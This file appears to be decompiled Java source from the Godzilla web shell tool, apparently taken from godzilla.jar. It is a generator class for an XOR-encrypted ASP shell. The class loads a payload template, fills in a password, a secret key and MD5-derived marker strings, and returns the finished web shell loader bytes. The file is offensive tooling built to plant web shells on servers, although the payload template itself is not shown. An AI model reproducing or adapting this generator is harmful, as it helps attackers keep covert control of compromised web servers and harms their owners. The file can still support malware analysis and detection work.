/*    */ package shells.cryptions.aspXor;
/*    */ 
/*    */ import java.io.InputStream;
/*    */ import util.Log;
/*    */ import util.TemplateEx;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ class Generate
/*    */ {
/*    */   public static byte[] GenerateShellLoder(String pass, String secretKey, String className) {
/* 15 */     byte[] data = null;
/*    */     
/* 17 */     String findStrMd5 = functions.md5(pass + secretKey);
/* 18 */     String findStrLeft = findStrMd5.substring(0, 6);
/* 19 */     String findStrRight = findStrMd5.substring(20, 26);
/*    */     try {
/* 21 */       InputStream inputStream = Generate.class.getResourceAsStream("template/" + className + ".bin");
/* 22 */       String code = new String(functions.readInputStream(inputStream));
/* 23 */       inputStream.close();
/* 24 */       code = code.replace("{pass}", pass).replace("{secretKey}", secretKey).replace("{findStrLeft}", findStrLeft).replace("{findStrRight}", findStrRight);
/* 25 */       code = TemplateEx.run(code);
/* 26 */       data = code.getBytes();
/*    */     }
/* 28 */     catch (Exception e) {
/* 29 */       Log.error(e);
/*    */     } 
/* 31 */     return data;
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\aspXor\Generate.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */